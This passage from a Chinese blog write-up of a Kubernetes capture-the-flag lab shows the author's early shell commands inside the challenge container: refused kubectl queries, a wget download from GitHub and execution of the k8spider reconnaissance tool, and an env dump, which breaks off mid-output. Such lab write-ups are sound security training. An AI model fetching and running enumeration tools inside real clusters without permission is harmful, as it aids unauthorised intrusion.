<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>EKS Cluster Games wp - By.Starven | Starven's Blog</title><meta name="author" content="Starven"><meta name="copyright" content="Starven"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Secret Seeker先贴一下打的过程中前期的shell命令吧，也体现一下我的容器中的信息收集思路 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787">
<meta property="og:type" content="article">
<meta property="og:title" content="EKS Cluster Games wp - By.Starven">
<meta property="og:url" content="https://starven-l.github.io/2025/07/09/EKS-Cluster-Games-wp-By-Starven/index.html">
<meta property="og:site_name" content="Starven&#39;s Blog">
<meta property="og:description" content="Secret Seeker先贴一下打的过程中前期的shell命令吧，也体现一下我的容器中的信息收集思路 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim">
<meta property="article:published_time" content="2025-07-09T09:37:27.000Z">
<meta property="article:modified_time" content="2025-07-09T09:39:44.211Z">
<meta property="article:author" content="Starven">
<meta property="article:tag" content="云安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "EKS Cluster Games wp - By.Starven",
  "url": "https://starven-l.github.io/2025/07/09/EKS-Cluster-Games-wp-By-Starven/",
  "image": "https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim",
  "datePublished": "2025-07-09T09:37:27.000Z",
  "dateModified": "2025-07-09T09:39:44.211Z",
  "author": [
    {
      "@type": "Person",
      "name": "Starven",
      "url": "https://starven-l.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://starven-l.github.io/2025/07/09/EKS-Cluster-Games-wp-By-Starven/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'EKS Cluster Games wp - By.Starven',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> 搜索</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-archive"></i><span> 文档</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" alt="Logo"><span class="site-name">Starven's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">EKS Cluster Games wp - By.Starven</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> 搜索</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-archive"></i><span> 文档</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">EKS Cluster Games wp - By.Starven</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-09T09:37:27.000Z" title="发表于 2025-07-09 17:37:27">2025-07-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-09T09:39:44.211Z" title="更新于 2025-07-09 17:39:44">2025-07-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Secret-Seeker"><a href="#Secret-Seeker" class="headerlink" title="Secret Seeker"></a>Secret Seeker</h1><p>先贴一下打的过程中前期的shell命令吧，也体现一下我的容器中的信息收集思路</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get pods -A</span><br><span class="line"><span class="title class_">Error</span> <span class="keyword">from</span> <span class="title function_">server</span> (<span class="title class_">Forbidden</span>): pods is <span class="attr">forbidden</span>: <span class="title class_">User</span> <span class="string">&quot;system:serviceaccount:challenge1:service-account-challenge1&quot;</span> cannot list resource <span class="string">&quot;pods&quot;</span> <span class="keyword">in</span> <span class="variable constant_">API</span> group <span class="string">&quot;&quot;</span> at the cluster scope</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get nodes -A</span><br><span class="line"><span class="title class_">Error</span> <span class="keyword">from</span> <span class="title function_">server</span> (<span class="title class_">Forbidden</span>): nodes is <span class="attr">forbidden</span>: <span class="title class_">User</span> <span class="string">&quot;system:serviceaccount:challenge1:service-account-challenge1&quot;</span> cannot list resource <span class="string">&quot;nodes&quot;</span> <span class="keyword">in</span> <span class="variable constant_">API</span> group <span class="string">&quot;&quot;</span> at the cluster scope</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# nmap</span><br><span class="line"><span class="attr">bash</span>: <span class="attr">nmap</span>: command not found</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# uname -a</span><br><span class="line"><span class="title class_">Linux</span> wiz-eks-challenge <span class="number">5.10</span><span class="number">.192</span>-<span class="number">183.736</span>.<span class="property">amzn2</span>.<span class="property">x86_64</span> #<span class="number">1</span> <span class="variable constant_">SMP</span> <span class="title class_">Wed</span> <span class="title class_">Sep</span> <span class="number">6</span> <span class="number">21</span>:<span class="number">15</span>:<span class="number">41</span> <span class="variable constant_">UTC</span> <span class="number">2023</span> x86_64 x86_64 x86_64 <span class="variable constant_">GNU</span>/<span class="title class_">Linux</span></span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# pwd</span><br><span class="line">/home/user</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# wget <span class="attr">https</span>:<span class="comment">//github.com/Esonhugh/k8spider/releases/download/v3.1.0/k8spider_v3.1.0_linux_amd64.tar.gz</span></span><br><span class="line">--<span class="number">2025</span>-<span class="number">07</span>-<span class="number">09</span> <span class="number">02</span>:<span class="number">18</span>:<span class="number">57</span>--  <span class="attr">https</span>:<span class="comment">//github.com/Esonhugh/k8spider/releases/download/v3.1.0/k8spider_v3.1.0_linux_amd64.tar.gz</span></span><br><span class="line"><span class="title class_">Resolving</span> github.<span class="property">com</span> (github.<span class="property">com</span>)... <span class="number">140.82</span><span class="number">.116</span><span class="number">.4</span></span><br><span class="line"><span class="title class_">Connecting</span> to github.<span class="property">com</span> (github.<span class="property">com</span>)|<span class="number">140.82</span><span class="number">.116</span><span class="number">.4</span>|:<span class="number">443.</span>.. connected.</span><br><span class="line"><span class="variable constant_">HTTP</span> request sent, awaiting response... <span class="number">302</span> <span class="title class_">Found</span></span><br><span class="line"><span class="title class_">Location</span>: <span class="attr">https</span>:<span class="comment">//objects.githubusercontent.com/github-production-release-asset-2e65be/773054132/8e380c09-2125-4cc5-ab34-ac98eb97114a?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=releaseassetproduction%2F20250709%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250709T021857Z&amp;X-Amz-Expires=1800&amp;X-Amz-Signature=90296b965b29c2ef6f9e935b35bc7987764676817e7cb1403b773d4ff02fc04d&amp;X-Amz-SignedHeaders=host&amp;response-content-disposition=attachment%3B%20filename%3Dk8spider_v3.1.0_linux_amd64.tar.gz&amp;response-content-type=application%2Foctet-stream [following]</span></span><br><span class="line">--<span class="number">2025</span>-<span class="number">07</span>-<span class="number">09</span> <span class="number">02</span>:<span class="number">18</span>:<span class="number">57</span>--  <span class="attr">https</span>:<span class="comment">//objects.githubusercontent.com/github-production-release-asset-2e65be/773054132/8e380c09-2125-4cc5-ab34-ac98eb97114a?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=releaseassetproduction%2F20250709%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20250709T021857Z&amp;X-Amz-Expires=1800&amp;X-Amz-Signature=90296b965b29c2ef6f9e935b35bc7987764676817e7cb1403b773d4ff02fc04d&amp;X-Amz-SignedHeaders=host&amp;response-content-disposition=attachment%3B%20filename%3Dk8spider_v3.1.0_linux_amd64.tar.gz&amp;response-content-type=application%2Foctet-stream</span></span><br><span class="line"><span class="title class_">Resolving</span> objects.<span class="property">githubusercontent</span>.<span class="property">com</span> (objects.<span class="property">githubusercontent</span>.<span class="property">com</span>)... <span class="number">185.199</span><span class="number">.111</span><span class="number">.133</span>, <span class="number">185.199</span><span class="number">.109</span><span class="number">.133</span>, <span class="number">185.199</span><span class="number">.108</span><span class="number">.133</span>, ...</span><br><span class="line"><span class="title class_">Connecting</span> to objects.<span class="property">githubusercontent</span>.<span class="property">com</span> (objects.<span class="property">githubusercontent</span>.<span class="property">com</span>)|<span class="number">185.199</span><span class="number">.111</span><span class="number">.133</span>|:<span class="number">443.</span>.. connected.</span><br><span class="line"><span class="variable constant_">HTTP</span> request sent, awaiting response... <span class="number">200</span> <span class="variable constant_">OK</span></span><br><span class="line"><span class="title class_">Length</span>: <span class="number">2482752</span> (<span class="number">2.</span>4M) [application/octet-stream]</span><br><span class="line"><span class="title class_">Saving</span> <span class="attr">to</span>: <span class="string">&#x27;k8spider_v3.1.0_linux_amd64.tar.gz&#x27;</span></span><br><span class="line"></span><br><span class="line">k8spider_v3<span class="number">.1</span>.0_linux_amd64.<span class="property">tar</span>.<span class="property">gz</span>       <span class="number">100</span>%[===============================================================================&gt;]   <span class="number">2.</span>37M  --.-<span class="variable constant_">KB</span>/s    <span class="keyword">in</span> <span class="number">0.</span>02s   </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">07</span>-<span class="number">09</span> <span class="number">02</span>:<span class="number">18</span>:<span class="number">57</span> (<span class="number">114</span> <span class="variable constant_">MB</span>/s) - <span class="string">&#x27;k8spider_v3.1.0_linux_amd64.tar.gz&#x27;</span> saved [<span class="number">2482752</span>/<span class="number">2482752</span>]</span><br><span class="line"></span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# ls</span><br><span class="line">k8spider_v3<span class="number">.1</span>.0_linux_amd64.<span class="property">tar</span>.<span class="property">gz</span></span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# tar 0xvzf k8spider_v3<span class="number">.1</span>.0_linux_amd64.<span class="property">tar</span>.<span class="property">gz</span> ^C</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# tar -xvzf k8spider_v3<span class="number">.1</span>.0_linux_amd64.<span class="property">tar</span>.<span class="property">gz</span> </span><br><span class="line"><span class="variable constant_">README</span>.<span class="property">md</span></span><br><span class="line"><span class="attr">tar</span>: <span class="variable constant_">README</span>.<span class="property">md</span>: <span class="title class_">Cannot</span> change ownership to uid <span class="number">1001</span>, gid <span class="number">118</span>: <span class="title class_">Invalid</span> argument</span><br><span class="line">k8spider</span><br><span class="line"><span class="attr">tar</span>: <span class="attr">k8spider</span>: <span class="title class_">Cannot</span> change ownership to uid <span class="number">1001</span>, gid <span class="number">118</span>: <span class="title class_">Invalid</span> argument</span><br><span class="line"><span class="attr">tar</span>: <span class="title class_">Exiting</span> <span class="keyword">with</span> failure status due to previous errors</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# tar --no-same-owner -xvzf k8spider_v3<span class="number">.1</span>.0_linux_amd64.<span class="property">tar</span>.<span class="property">gz</span></span><br><span class="line"><span class="variable constant_">README</span>.<span class="property">md</span></span><br><span class="line">k8spider</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# ls</span><br><span class="line"><span class="variable constant_">README</span>.<span class="property">md</span>  k8spider  k8spider_v3<span class="number">.1</span>.0_linux_amd64.<span class="property">tar</span>.<span class="property">gz</span></span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# cd k8spider</span><br><span class="line"><span class="attr">bash</span>: <span class="attr">cd</span>: <span class="attr">k8spider</span>: <span class="title class_">Not</span> a directory</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# ls</span><br><span class="line"><span class="variable constant_">README</span>.<span class="property">md</span>  k8spider  k8spider_v3<span class="number">.1</span>.0_linux_amd64.<span class="property">tar</span>.<span class="property">gz</span></span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# ./k8spider all</span><br><span class="line"><span class="variable constant_">WARN</span>[<span class="number">0000</span>] current environment is not a kubernetes cluster </span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# env</span><br><span class="line"><span class="variable constant_">USER_ID</span>=85ac6097-d19e-43c4-<span class="number">8235</span>-7f167074b23d</span><br><span class="line"><span class="variable constant_">PWD</span>=<span class="regexp">/home/u</span>ser</span><br><span class="line"><span class="variable constant_">HOME</span>=<span class="regexp">/home/u</span>ser</span><br><span class="line"><span class="variable constant_">LS_COLORS</span>=rs=<span class="number">0</span>:di=<span class="number">01</span>;<span class="number">34</span>:ln=<span class="number">01</span>;<span class="number">36</span>:mh=<span class="number">00</span>:pi=<span class="number">40</span>;<span class="number">33</span>:so=<span class="number">01</span>;<span class="number">35</span>:<span class="keyword">do</span>=<span class="number">01</span>;<span class="number">35</span>:bd=<span class="number">40</span>;<span class="number">33</span>;<span class="number">01</span>:cd=<span class="number">40</span>;<span class="number">33</span>;<span class="number">01</span>:or=<span class="number">40</span>;<span class="number">31</span>;<span class="number">01</span>:mi=<span class="number">00</span>:su=<span class="number">37</span>;<span class="number">41</span>:sg=<span class="number">30</span>;<span class="number">43</span>:ca=<span class="number">30</span>;<span class="number">41</span>:tw=<span class="number">30</span>;<span class="number">42</span>:ow=<span class="number">34</span>;<span class="number">42</span>:st=<span class="number">37</span>;<span class="number">44</span>:ex=<span class="number">01</span>;<span class="number">32</span>:*.<span class="property">tar</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">tgz</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">arc</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">arj</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">taz</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">lha</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">lz4</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">lzh</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">lzma</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">tlz</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">txz</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">tzo</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">t7z</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">zip</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">z</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">dz</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">gz</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">lrz</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">lz</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">lzo</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">xz</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">zst</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">tzst</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">bz2</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">bz</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">tbz</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">tbz2</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">tz</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">deb</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">rpm</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">jar</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">war</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">ear</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">sar</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">rar</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">alz</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">ace</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">zoo</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">cpio</span>=<span class="number">01</span>;<span class="number">31</span>:*.7z=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">rz</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">cab</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">wim</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">swm</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">dwm</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">esd</span>=<span class="number">01</span>;<span class="number">31</span>:*.<span class="property">jpg</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">jpeg</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">mjpg</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">mjpeg</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">gif</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">bmp</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">pbm</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">pgm</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">ppm</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">tga</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">xbm</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">xpm</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">tif</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">tiff</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">png</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">svg</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">svgz</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">mng</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">pcx</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">mov</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">mpg</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">mpeg</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">m2v</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">mkv</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">webm</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">webp</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">ogm</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">mp4</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">m4v</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">mp4v</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">vob</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">qt</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">nuv</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">wmv</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">asf</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">rm</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">rmvb</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">flc</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">avi</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">fli</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">flv</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">gl</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">dl</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">xcf</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">xwd</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">yuv</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">cgm</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">emf</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">ogv</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">ogx</span>=<span class="number">01</span>;<span class="number">35</span>:*.<span class="property">aac</span>=<span class="number">00</span>;<span class="number">36</span>:*.<span class="property">au</span>=<span class="number">00</span>;<span class="number">36</span>:*.<span class="property">flac</span>=<span class="number">00</span>;<span class="number">36</span>:*.<span class="property">m4a</span>=<span class="number">00</span>;<span class="number">36</span>:*.<span class="property">mid</span>=<span class="number">00</span>;<span class="number">36</span>:*.<span class="property">midi</span>=<span class="number">00</span>;<span class="number">36</span>:*.<span class="property">mka</span>=<span class="number">00</span>;<span class="number">36</span>:*.<span class="property">mp3</span>=<span class="number">00</span>;<span class="number">36</span>:*.<span class="property">mpc</span>=<span class="number">00</span>;<span class="number">36</span>:*.<span class="property">ogg</span>=<span class="number">00</span>;<span class="number">36</span>:*.<span class="property">ra</span>=<span class="number">00</span>;<span class="number">36</span>:*.<span class="property">wav</span>=<span class="number">00</span>;<span class="number">36</span>:*.<span class="property">oga</span>=<span class="number">00</span>;<span class="number">36</span>:*.<span class="property">opus</span>=<span class="number">00</span>;<span 